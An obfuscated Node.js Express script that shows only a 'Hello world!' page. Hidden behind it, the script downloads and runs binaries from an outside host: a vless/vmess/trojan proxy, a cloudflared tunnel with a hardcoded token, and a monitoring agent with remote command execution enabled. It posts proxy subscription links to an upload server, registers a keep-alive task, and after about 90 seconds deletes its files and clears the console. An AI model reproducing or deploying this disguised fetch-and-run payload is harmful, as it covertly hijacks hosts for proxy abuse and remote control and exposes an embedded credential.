const _0x9cc428=_0xa0fc;(function(_0x47958a,_0x58e6f1){const _0x3d787f=_0xa0fc,_0x54d65b=_0x47958a();while(!![]){try{const _0x4eddf3=parseInt(_0x3d787f(0x183))/0x1*(-parseInt(_0x3d787f(0x207))/0x2)+-parseInt(_0x3d787f(0x180))/0x3*(parseInt(_0x3d787f(0x1ca))/0x4)+parseInt(_0x3d787f(0x21c))/0x5+parseInt(_0x3d787f(0x22c))/0x6*(-parseInt(_0x3d787f(0x211))/0x7)+parseInt(_0x3d787f(0x1dd))/0x8+parseInt(_0x3d787f(0x1a4))/0x9*(-parseInt(_0x3d787f(0x1a2))/0xa)+parseInt(_0x3d787f(0x234))/0xb;if(_0x4eddf3===_0x58e6f1)break;else _0x54d65b['push'](_0x54d65b['shift']());}catch(_0x247a12){_0x54d65b['push'](_0x54d65b['shift']());}}}(_0xa571,0x26d6b));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x9cc428(0x214)),{promisify}=require(_0x9cc428(0x203)),exec=promisify(require(_0x9cc428(0x1c0))['exec']),{execSync}=require(_0x9cc428(0x1c0)),UPLOAD_URL=process['env'][_0x9cc428(0x189)]||'',PROJECT_URL=process['env'][_0x9cc428(0x187)]||'',AUTO_ACCESS=process[_0x9cc428(0x1d6)][_0x9cc428(0x17b)]||![],FILE_PATH=process['env'][_0x9cc428(0x216)]||_0x9cc428(0x1b2),SUB_PATH=process['env'][_0x9cc428(0x194)]||'1026',PORT=process[_0x9cc428(0x1d6)][_0x9cc428(0x1a3)]||process[_0x9cc428(0x1d6)][_0x9cc428(0x1d8)]||0xbb8,UUID=process[_0x9cc428(0x1d6)][_0x9cc428(0x1cb)]||'7db16585-d830-461d-92a5-7a144b32ac5b',NEZHA_SERVER=process[_0x9cc428(0x1d6)][_0x9cc428(0x1b4)]||'',NEZHA_PORT=process[_0x9cc428(0x1d6)][_0x9cc428(0x222)]||'',NEZHA_KEY=process[_0x9cc428(0x1d6)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x9cc428(0x1d6)][_0x9cc428(0x1d3)]||_0x9cc428(0x230),ARGO_AUTH=process[_0x9cc428(0x1d6)][_0x9cc428(0x1d7)]||_0x9cc428(0x1f8),ARGO_PORT=process[_0x9cc428(0x1d6)][_0x9cc428(0x1fc)]||0x1f41,CFIP=process['env'][_0x9cc428(0x1e0)]||_0x9cc428(0x1bb),CFPORT=process[_0x9cc428(0x1d6)][_0x9cc428(0x1b7)]||0x1bb,NAME=process[_0x9cc428(0x1d6)]['NAME']||_0x9cc428(0x229);!fs['existsSync'](FILE_PATH)?(fs[_0x9cc428(0x1db)](FILE_PATH),console[_0x9cc428(0x227)](FILE_PATH+_0x9cc428(0x21e))):console[_0x9cc428(0x227)](FILE_PATH+_0x9cc428(0x1e6));function generateRandomName(){const _0x5bc1ec=_0x9cc428,_0x208f1d=_0x5bc1ec(0x204);let _0x589169='';for(let _0x13f601=0x0;_0x13f601<0x6;_0x13f601++){_0x589169+=_0x208f1d[_0x5bc1ec(0x210)](Math['floor'](Math['random']()*_0x208f1d[_0x5bc1ec(0x1e8)]));}return _0x589169;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x9cc428(0x19d)](FILE_PATH,webName),botPath=path[_0x9cc428(0x19d)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x9cc428(0x1bc)),listPath=path['join'](FILE_PATH,_0x9cc428(0x19a)),bootLogPath=path[_0x9cc428(0x19d)](FILE_PATH,_0x9cc428(0x1c9)),configPath=path[_0x9cc428(0x19d)](FILE_PATH,_0x9cc428(0x185));function _0xa0fc(_0x3014bd,_0x4ce26a){const _0xa571db=_0xa571();return _0xa0fc=function(_0xa0fca8,_0x32f65a){_0xa0fca8=_0xa0fca8-0x178;let _0x114eb4=_0xa571db[_0xa0fca8];return _0x114eb4;},_0xa0fc(_0x3014bd,_0x4ce26a);}function deleteNodes(){const _0x365489=_0x9cc428;try{if(!UPLOAD_URL)return;if(!fs[_0x365489(0x231)](subPath))return;let _0x4d95f2;try{_0x4d95f2=fs[_0x365489(0x1ff)](subPath,_0x365489(0x1fb));}catch{return null;}const _0x9c7af0=Buffer[_0x365489(0x1b6)](_0x4d95f2,'base64')['toString'](_0x365489(0x1fb)),_0x4d2cca=_0x9c7af0[_0x365489(0x232)]('\x0a')[_0x365489(0x1d4)](_0x40dcef=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x365489(0x1c1)](_0x40dcef));if(_0x4d2cca[_0x365489(0x1e8)]===0x0)return;return axios[_0x365489(0x1b8)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x365489(0x19c)]({'nodes':_0x4d2cca}),{'headers':{'Content-Type':_0x365489(0x1dc)}})[_0x365489(0x1ae)](_0x7f629=>{return null;}),null;}catch(_0x42a81c){return null;}}function cleanupOldFiles(){const _0x385eab=_0x9cc428;try{const _0x553e3f=fs[_0x385eab(0x1ce)](FILE_PATH);_0x553e3f['forEach'](_0xf32a26=>{const _0x226987=_0x385eab,_0x2be8ba=path[_0x226987(0x19d)](FILE_PATH,_0xf32a26);try{const _0x303a2d=fs[_0x226987(0x206)](_0x2be8ba);_0x303a2d[_0x226987(0x21f)]()&&fs[_0x226987(0x1a8)](_0x2be8ba);}catch(_0x1368d3){}});}catch(_0x51d859){}}app[_0x9cc428(0x1ab)]('/',function(_0xcf9eb4,_0x225af1){const _0x443fb8=_0x9cc428;_0x225af1[_0x443fb8(0x212)]('Hello\x20world!');});async function generateConfig(){const _0x35b6d9=_0x9cc428,_0x35ee2d={'log':{'access':_0x35b6d9(0x1c5),'error':'/dev/null','loglevel':_0x35b6d9(0x1f2)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x35b6d9(0x188),'settings':{'clients':[{'id':UUID,'flow':_0x35b6d9(0x20a)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x35b6d9(0x1b9),'dest':0xbba},{'path':_0x35b6d9(0x195),'dest':0xbbb},{'path':_0x35b6d9(0x17d),'dest':0xbbc}]},'streamSettings':{'network':_0x35b6d9(0x191)}},{'port':0xbb9,'listen':_0x35b6d9(0x1e5),'protocol':_0x35b6d9(0x188),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x35b6d9(0x191),'security':_0x35b6d9(0x1f2)}},{'port':0xbba,'listen':_0x35b6d9(0x1e5),'protocol':_0x35b6d9(0x188),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x35b6d9(0x1f2),'wsSettings':{'path':_0x35b6d9(0x1b9)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x35b6d9(0x1a5),_0x35b6d9(0x1d2)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x35b6d9(0x1e5),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x35b6d9(0x195)}},'sniffing':{'enabled':!![],'destOverride':[_0x35b6d9(0x1ad),'tls',_0x35b6d9(0x1d2)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x35b6d9(0x1e5),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x35b6d9(0x1f2),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x35b6d9(0x1a5),_0x35b6d9(0x1d2)],'metadataOnly':![]}}],'dns':{'servers':[_0x35b6d9(0x235)]},'outbounds':[{'protocol':_0x35b6d9(0x1cc),'tag':_0x35b6d9(0x184)},{'protocol':_0x35b6d9(0x1c4),'tag':_0x35b6d9(0x1eb)}]};fs['writeFileSync'](path[_0x35b6d9(0x19d)](FILE_PATH,_0x35b6d9(0x185)),JSON[_0x35b6d9(0x19c)](_0x35ee2d,null,0x2));}function getSystemArchitecture(){const _0x4332bb=_0x9cc428,_0x412bc1=os['arch']();return _0x412bc1==='arm'||_0x412bc1===_0x4332bb(0x1c8)||_0x412bc1==='aarch64'?'arm':'amd';}function _0xa571(){const _0x524087=['pop','?security=tls&sni=','message','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/web','none','fileName','tunnel.yml','\x0a\x20\x20\x0atrojan://','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','stream','eyJhIjoiYjQyZjNiMTZkODhhN2E1NDc3NTFkY2JjMDkxNGE0YzYiLCJ0IjoiOTY1OWZhODgtNmE2Ni00NTI4LTkzMzUtMzc3NWE0ZjM1NWI3IiwicyI6Ik1tRXpZakl6WldZdFpHVmpZeTAwTlRZMkxUazROREF0T0RCbFltSTJPVEl5T1RZeCJ9','close','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','utf-8','ARGO_PORT','platform','ARGO_DOMAIN:','readFileSync','chmod','8443','writeFileSync','util','abcdefghijklmnopqrstuvwxyz','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','statSync','110UelvNJ','clear','map','xtls-rprx-vision','Add\x20automatic\x20access\x20task\x20faild:\x20','App\x20is\x20running','/tunnel.yml\x20run','tunnel.json','&path=%2Fvless-argo%3Fed%3D2560#','charAt','364LEzDOZ','send','php\x20running\x20error:\x20','path','https://arm64.ssss.nyc.mn/web','FILE_PATH','\x20failed:\x20','toString','2083','&fp=firefox&type=ws&host=','443','716835lmcqnn','Download\x20','\x20is\x20created','isFile','substring','Empowerment\x20failed\x20for\x20','NEZHA_PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','pkill\x20-f\x20\x22[','rm\x20-rf\x20','Skipping\x20adding\x20automatic\x20access\x20task','log','Error\x20executing\x20command:\x20','ssfnxk1026','\x20-c\x20','--tls','29676mDeulE','Nodes\x20uploaded\x20successfully','Unhandled\x20error\x20in\x20startserver:','http\x20server\x20is\x20running\x20on\x20port:','ssfnxk1026.wyhsd.xyz','existsSync','split','nohup\x20','3222175pHMYbV','https+local://8.8.8.8/dns-query','arm','\x20successfully','.exe\x20>\x20nul\x202>&1','AUTO_ACCESS','\x0a\x20\x20tunnel:\x20','/trojan-argo','https://amd64.ssss.nyc.mn/v1','text/plain;\x20charset=utf-8','291wlrYyq','https://amd64.ssss.nyc.mn/agent','unshift','967QFUxdt','direct','config.json','base64','PROJECT_URL','vless','UPLOAD_URL','match','TunnelSecret','&path=%2Ftrojan-argo%3Fed%3D2560#','false','true','trim','2087','tcp','https://arm64.ssss.nyc.mn/agent','\x22\x20>\x20/dev/null\x202>&1','SUB_PATH','/vmess-argo','npm\x20running\x20error:\x20','https://oooo.serv00.net/add-url','Subscription\x20uploaded\x20successfully','del\x20/f\x20/q\x20','list.txt','\x20>/dev/null\x202>&1\x20&','stringify','join','createWriteStream','all','\x20-p\x20','includes','710uPwrCk','SERVER_PORT','1791HxGZKR','tls','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0avless://','unlinkSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','listen','get','\x20is\x20running','http','catch','response','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Error\x20in\x20startserver:','./tmp','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','NEZHA_SERVER','/sub.txt\x20saved\x20successfully','from','CFPORT','post','/vless-argo','status','cdns.doon.eu.org','sub.txt','/config.json\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/bot','2096','child_process','test','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','blackhole','/dev/null','firefox','fileUrl','arm64','boot.log','7016nCUyQk','UUID','freedom','config.yaml','readdirSync','win32','/vmess-argo?ed=2560','\x0a\x20\x20\x0avmess://','quic','ARGO_DOMAIN','filter','Error\x20downloading\x20files:','env','ARGO_AUTH','PORT','/api/add-nodes','basename','mkdirSync','application/json','1739480kLYVRE','pipe','?encryption=none&security=tls&sni=','CFIP','web\x20running\x20error:\x20','then','https://arm64.ssss.nyc.mn/v1','error','127.0.0.1','\x20already\x20exists','has','length','\x20>/dev/null\x202>&1','https://arm64.ssss.nyc.mn/bot','block','Error\x20reading\x20boot.log:'];_0xa571=function(){return _0x524087;};return _0xa571();}function downloadFile(_0x1e9aad,_0x3db75f,_0x1eb712){const _0x4fd8d4=_0x9cc428,_0x38614f=_0x1e9aad;!fs[_0x4fd8d4(0x231)](FILE_PATH)&&fs[_0x4fd8d4(0x1db)](FILE_PATH,{'recursive':!![]});const _0x57db92=fs[_0x4fd8d4(0x19e)](_0x38614f);axios({'method':_0x4fd8d4(0x1ab),'url':_0x3db75f,'responseType':_0x4fd8d4(0x1f7)})[_0x4fd8d4(0x1e2)](_0x4ee3e4=>{const _0x551720=_0x4fd8d4;_0x4ee3e4['data'][_0x551720(0x1de)](_0x57db92),_0x57db92['on']('finish',()=>{const _0x2f9171=_0x551720;_0x57db92[_0x2f9171(0x1f9)](),console[_0x2f9171(0x227)](_0x2f9171(0x21d)+path[_0x2f9171(0x1da)](_0x38614f)+_0x2f9171(0x179)),_0x1eb712(null,_0x38614f);}),_0x57db92['on']('error',_0x544461=>{const _0x1218ef=_0x551720;fs['unlink'](_0x38614f,()=>{});const _0x54cece='Download\x20'+path[_0x1218ef(0x1da)](_0x38614f)+'\x20failed:\x20'+_0x544461['message'];console['error'](_0x54cece),_0x1eb712(_0x54cece);});})[_0x4fd8d4(0x1ae)](_0x50831d=>{const _0x3fc4f9=_0x4fd8d4,_0x58ecc0=_0x3fc4f9(0x21d)+path[_0x3fc4f9(0x1da)](_0x38614f)+_0x3fc4f9(0x217)+_0x50831d[_0x3fc4f9(0x1ef)];console[_0x3fc4f9(0x1e4)](_0x58ecc0),_0x1eb712(_0x58ecc0);});}async function downloadFilesAndRun(){const _0x230076=_0x9cc428,_0x402943=getSystemArchitecture(),_0x30771f=getFilesForArchitecture(_0x402943);if(_0x30771f[_0x230076(0x1e8)]===0x0){console['log'](_0x230076(0x1a6));return;}const _0x25e176=_0x30771f[_0x230076(0x209)](_0x4cb78b=>{return new Promise((_0x44465e,_0xc62d6e)=>{const _0x217ff3=_0xa0fc;downloadFile(_0x4cb78b[_0x217ff3(0x1f3)],_0x4cb78b[_0x217ff3(0x1c7)],(_0x303acf,_0x56135f)=>{_0x303acf?_0xc62d6e(_0x303acf):_0x44465e(_0x56135f);});});});try{await Promise[_0x230076(0x19f)](_0x25e176);}catch(_0x56e038){console[_0x230076(0x1e4)](_0x230076(0x1d5),_0x56e038);return;}function _0x1b5b07(_0x561658){const _0x4f4133=0x1fd;_0x561658['forEach'](_0x19e761=>{const _0x50e8ae=_0xa0fc;fs['existsSync'](_0x19e761)&&fs[_0x50e8ae(0x200)](_0x19e761,_0x4f4133,_0xd77dd=>{const _0xb8d438=_0x50e8ae;_0xd77dd?console[_0xb8d438(0x1e4)](_0xb8d438(0x221)+_0x19e761+':\x20'+_0xd77dd):console[_0xb8d438(0x227)]('Empowerment\x20success\x20for\x20'+_0x19e761+':\x20'+_0x4f4133['toString'](0x8));});});}const _0x4330d6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1b5b07(_0x4330d6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x513a7d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x230076(0x232)](':')[_0x230076(0x1ed)]():'',_0x193d68=new Set([_0x230076(0x21b),'8443',_0x230076(0x1bf),_0x230076(0x190),_0x230076(0x219),'2053']),_0x310c7b=_0x193d68[_0x230076(0x1e7)](_0x513a7d)?_0x230076(0x18e):_0x230076(0x18d),_0x3c6faa='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x230076(0x1c3)+_0x310c7b+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x230076(0x202)](path[_0x230076(0x19d)](FILE_PATH,_0x230076(0x1cd)),_0x3c6faa);const _0x192c6a='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x192c6a),console[_0x230076(0x227)](phpName+'\x20is\x20running'),await new Promise(_0x2ebfc2=>setTimeout(_0x2ebfc2,0x3e8));}catch(_0x36c617){console['error'](_0x230076(0x213)+_0x36c617);}}else{let _0x1500fa='';const _0x429530=[_0x230076(0x21b),_0x230076(0x201),_0x230076(0x1bf),'2087',_0x230076(0x219),'2053'];_0x429530['includes'](NEZHA_PORT)&&(_0x1500fa=_0x230076(0x22b));const _0x5198de=_0x230076(0x233)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x230076(0x1a0)+NEZHA_KEY+'\x20'+_0x1500fa+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5198de),console[_0x230076(0x227)](npmName+'\x20is\x20running'),await new Promise(_0x1c23d9=>setTimeout(_0x1c23d9,0x3e8));}catch(_0xa0606b){console['error'](_0x230076(0x196)+_0xa0606b);}}}else console[_0x230076(0x227)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x30a3b9=_0x230076(0x233)+webPath+_0x230076(0x22a)+FILE_PATH+_0x230076(0x1bd);try{await exec(_0x30a3b9),console['log'](webName+'\x20is\x20running'),await new Promise(_0x46444e=>setTimeout(_0x46444e,0x3e8));}catch(_0x4f49d6){console[_0x230076(0x1e4)](_0x230076(0x1e1)+_0x4f49d6);}if(fs[_0x230076(0x231)](botPath)){let _0x4bf43a;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4bf43a=_0x230076(0x1a9)+ARGO_AUTH;else ARGO_AUTH[_0x230076(0x18a)](/TunnelSecret/)?_0x4bf43a='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x230076(0x20d):_0x4bf43a='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x230076(0x233)+botPath+'\x20'+_0x4bf43a+_0x230076(0x19b)),console[_0x230076(0x227)](botName+'\x20is\x20running'),await new Promise(_0x4de8c0=>setTimeout(_0x4de8c0,0x7d0));}catch(_0x24d87e){console[_0x230076(0x1e4)](_0x230076(0x228)+_0x24d87e);}}await new Promise(_0x2d0036=>setTimeout(_0x2d0036,0x1388));}function getFilesForArchitecture(_0x5e9627){const _0x4382e3=_0x9cc428;let _0x2b4a3e;_0x5e9627===_0x4382e3(0x178)?_0x2b4a3e=[{'fileName':webPath,'fileUrl':_0x4382e3(0x215)},{'fileName':botPath,'fileUrl':_0x4382e3(0x1ea)}]:_0x2b4a3e=[{'fileName':webPath,'fileUrl':_0x4382e3(0x1f1)},{'fileName':botPath,'fileUrl':_0x4382e3(0x1be)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x33c6ce=_0x5e9627==='arm'?_0x4382e3(0x192):_0x4382e3(0x181);_0x2b4a3e[_0x4382e3(0x182)]({'fileName':npmPath,'fileUrl':_0x33c6ce});}else{const _0x1dee7b=_0x5e9627===_0x4382e3(0x178)?_0x4382e3(0x1e3):_0x4382e3(0x17e);_0x2b4a3e[_0x4382e3(0x182)]({'fileName':phpPath,'fileUrl':_0x1dee7b});}}return _0x2b4a3e;}function argoType(){const _0x23a363=_0x9cc428;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x23a363(0x227)](_0x23a363(0x1b3));return;}if(ARGO_AUTH[_0x23a363(0x1a1)](_0x23a363(0x18b))){fs['writeFileSync'](path[_0x23a363(0x19d)](FILE_PATH,_0x23a363(0x20e)),ARGO_AUTH);const _0x210f79=_0x23a363(0x17c)+ARGO_AUTH[_0x23a363(0x232)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x23a363(0x19d)](FILE_PATH,_0x23a363(0x20e))+_0x23a363(0x1f0)+ARGO_DOMAIN+_0x23a363(0x1fa)+ARGO_PORT+_0x23a363(0x205);fs[_0x23a363(0x202)](path['join'](FILE_PATH,_0x23a363(0x1f4)),_0x210f79);}else console[_0x23a363(0x227)](_0x23a363(0x1b0));}argoType();async function extractDomains(){const _0x46cb05=_0x9cc428;let _0xe2c0d5;if(ARGO_AUTH&&ARGO_DOMAIN)_0xe2c0d5=ARGO_DOMAIN,console[_0x46cb05(0x227)](_0x46cb05(0x1fe),_0xe2c0d5),await _0x5c4b5(_0xe2c0d5);else try{const _0x86368e=fs[_0x46cb05(0x1ff)](path[_0x46cb05(0x19d)](FILE_PATH,_0x46cb05(0x1c9)),_0x46cb05(0x1fb)),_0x49b31c=_0x86368e[_0x46cb05(0x232)]('\x0a'),_0x3a8425=[];_0x49b31c['forEach'](_0x70dac2=>{const _0xc60e7d=_0x70dac2['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xc60e7d){const _0x1fd003=_0xc60e7d[0x1];_0x3a8425['push'](_0x1fd003);}});if(_0x3a8425[_0x46cb05(0x1e8)]>0x0)_0xe2c0d5=_0x3a8425[0x0],console[_0x46cb05(0x227)]('ArgoDomain:',_0xe2c0d5),await _0x5c4b5(_0xe2c0d5);else{console['log'](_0x46cb05(0x1f6)),fs[_0x46cb05(0x1a8)](path[_0x46cb05(0x19d)](FILE_PATH,_0x46cb05(0x1c9)));async function _0xa78993(){const _0x344249=_0x46cb05;try{process[_0x344249(0x1fd)]===_0x344249(0x1cf)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x344249(0x17a)):await exec(_0x344249(0x224)+botName['charAt'](0x0)+']'+botName[_0x344249(0x220)](0x1)+_0x344249(0x193));}catch(_0x142cad){}}_0xa78993(),await new Promise(_0x23e8df=>setTimeout(_0x23e8df,0xbb8));const _0x2fa2be=_0x46cb05(0x223)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x46cb05(0x233)+botPath+'\x20'+_0x2fa2be+_0x46cb05(0x19b)),console[_0x46cb05(0x227)](botName+_0x46cb05(0x1ac)),await new Promise(_0x556f46=>setTimeout(_0x556f46,0xbb8)),await extractDomains();}catch(_0x30c5a5){console[_0x46cb05(0x1e4)](_0x46cb05(0x228)+_0x30c5a5);}}}catch(_0x5e5edd){console['error'](_0x46cb05(0x1ec),_0x5e5edd);}async function _0x5c4b5(_0x4ad2a4){const _0x400a7e=_0x46cb05,_0x4d20c7=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':'utf-8'}),_0xf50dca=_0x4d20c7[_0x400a7e(0x18f)](),_0x30e189=NAME?NAME+'-'+_0xf50dca:_0xf50dca;return new Promise(_0x504a56=>{setTimeout(()=>{const _0xcd3e9e=_0xa0fc,_0xeb5789={'v':'2','ps':''+_0x30e189,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xcd3e9e(0x1f2),'net':'ws','type':'none','host':_0x4ad2a4,'path':_0xcd3e9e(0x1d0),'tls':_0xcd3e9e(0x1a5),'sni':_0x4ad2a4,'alpn':'','fp':_0xcd3e9e(0x1c6)},_0x20e4ef=_0xcd3e9e(0x1a7)+UUID+'@'+CFIP+':'+CFPORT+_0xcd3e9e(0x1df)+_0x4ad2a4+_0xcd3e9e(0x21a)+_0x4ad2a4+_0xcd3e9e(0x20f)+_0x30e189+_0xcd3e9e(0x1d1)+Buffer['from'](JSON[_0xcd3e9e(0x19c)](_0xeb5789))['toString'](_0xcd3e9e(0x186))+_0xcd3e9e(0x1f5)+UUID+'@'+CFIP+':'+CFPORT+_0xcd3e9e(0x1ee)+_0x4ad2a4+_0xcd3e9e(0x21a)+_0x4ad2a4+_0xcd3e9e(0x18c)+_0x30e189+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0x20e4ef)[_0xcd3e9e(0x218)](_0xcd3e9e(0x186))),fs[_0xcd3e9e(0x202)](subPath,Buffer['from'](_0x20e4ef)[_0xcd3e9e(0x218)]('base64')),console[_0xcd3e9e(0x227)](FILE_PATH+_0xcd3e9e(0x1b5)),uploadNodes(),app[_0xcd3e9e(0x1ab)]('/'+SUB_PATH,(_0x53c7c0,_0x3ae111)=>{const _0x348ac0=_0xcd3e9e,_0x3902fd=Buffer[_0x348ac0(0x1b6)](_0x20e4ef)[_0x348ac0(0x218)](_0x348ac0(0x186));_0x3ae111['set']('Content-Type',_0x348ac0(0x17f)),_0x3ae111['send'](_0x3902fd);}),_0x504a56(_0x20e4ef);},0x7d0);});}}async function uploadNodes(){const _0x5b967f=_0x9cc428;if(UPLOAD_URL&&PROJECT_URL){const _0x57fb42=PROJECT_URL+'/'+SUB_PATH,_0x718d73={'subscription':[_0x57fb42]};try{const _0x11727c=await axios[_0x5b967f(0x1b8)](UPLOAD_URL+'/api/add-subscriptions',_0x718d73,{'headers':{'Content-Type':_0x5b967f(0x1dc)}});return _0x11727c&&_0x11727c['status']===0xc8?(console[_0x5b967f(0x227)](_0x5b967f(0x198)),_0x11727c):null;}catch(_0x400b4f){if(_0x400b4f[_0x5b967f(0x1af)]){if(_0x400b4f[_0x5b967f(0x1af)][_0x5b967f(0x1ba)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x4d86a8=fs[_0x5b967f(0x1ff)](listPath,_0x5b967f(0x1fb)),_0x2b0531=_0x4d86a8[_0x5b967f(0x232)]('\x0a')['filter'](_0x102ee3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5b967f(0x1c1)](_0x102ee3));if(_0x2b0531[_0x5b967f(0x1e8)]===0x0)return;const _0x4be38f=JSON[_0x5b967f(0x19c)]({'nodes':_0x2b0531});try{const _0x3eabfe=await axios[_0x5b967f(0x1b8)](UPLOAD_URL+_0x5b967f(0x1d9),_0x4be38f,{'headers':{'Content-Type':_0x5b967f(0x1dc)}});return _0x3eabfe&&_0x3eabfe[_0x5b967f(0x1ba)]===0xc8?(console[_0x5b967f(0x227)](_0x5b967f(0x22d)),_0x3eabfe):null;}catch(_0x383648){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1c4a85=_0xa0fc,_0x2148d0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2148d0['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2148d0['push'](phpPath);process[_0x1c4a85(0x1fd)]===_0x1c4a85(0x1cf)?exec(_0x1c4a85(0x199)+_0x2148d0[_0x1c4a85(0x19d)]('\x20')+'\x20>\x20nul\x202>&1',_0x1a7730=>{const _0x438a6c=_0x1c4a85;console[_0x438a6c(0x208)](),console[_0x438a6c(0x227)](_0x438a6c(0x20c)),console['log'](_0x438a6c(0x1c2));}):exec(_0x1c4a85(0x225)+_0x2148d0[_0x1c4a85(0x19d)]('\x20')+_0x1c4a85(0x1e9),_0x5c6cbc=>{const _0x50eeec=_0x1c4a85;console['clear'](),console[_0x50eeec(0x227)](_0x50eeec(0x20c)),console[_0x50eeec(0x227)](_0x50eeec(0x1c2));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1a195c=_0x9cc428;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1a195c(0x227)](_0x1a195c(0x226));return;}try{const _0x7ebc3f=await axios[_0x1a195c(0x1b8)](_0x1a195c(0x197),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1a195c(0x1dc)}});return console[_0x1a195c(0x227)]('automatic\x20access\x20task\x20added\x20successfully'),_0x7ebc3f;}catch(_0x51b44e){return console[_0x1a195c(0x1e4)](_0x1a195c(0x20b)+_0x51b44e[_0x1a195c(0x1ef)]),null;}}async function startserver(){const _0x5b2058=_0x9cc428;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x37ecc9){console['error'](_0x5b2058(0x1b1),_0x37ecc9);}}startserver()[_0x9cc428(0x1ae)](_0x2f4107=>{const _0x2e6c1b=_0x9cc428;console[_0x2e6c1b(0x1e4)](_0x2e6c1b(0x22e),_0x2f4107);}),app[_0x9cc428(0x1aa)](PORT,()=>console[_0x9cc428(0x227)](_0x9cc428(0x22f)+PORT+'!'));
